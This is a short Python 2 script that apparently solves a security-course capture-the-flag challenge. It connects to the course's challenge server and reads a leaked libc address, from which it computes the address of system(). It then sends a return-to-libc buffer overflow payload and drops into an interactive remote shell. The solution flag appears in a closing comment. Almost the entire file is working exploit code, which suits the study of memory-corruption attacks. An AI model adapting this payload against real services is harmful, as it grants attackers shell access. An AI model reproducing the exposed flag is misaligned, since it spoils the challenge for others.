#!/usr/bin/env python2

import struct
from socket import *
import telnetlib
import re
import struct

ip = 'secprog.cs.nctu.edu.tw'
port = 10107

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))
data = soc.recv(4096)
print(data)


# address of system() = libc_start_main - (offset of libc_start_main) + (offset of system())
m = re.search('(0x\S+)', data)
libc_start_main = int(m.group(0), 16)
print("get libc_start_main addr")
print((libc_start_main))

sys_addr = libc_start_main - 0x00019970 + 0x0003fc40
print("get system() addr")
print(hex(sys_addr))

# garbage + [&system]  + garbage + ["binsh"]
payload = "a"*24
payload += struct.pack('<I', sys_addr)
payload += "aaaa" + "\x20\x86\x04\x08"

soc.send(payload)
print("sent")

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()


# SECPROG{Return2LibcEasyVersion}
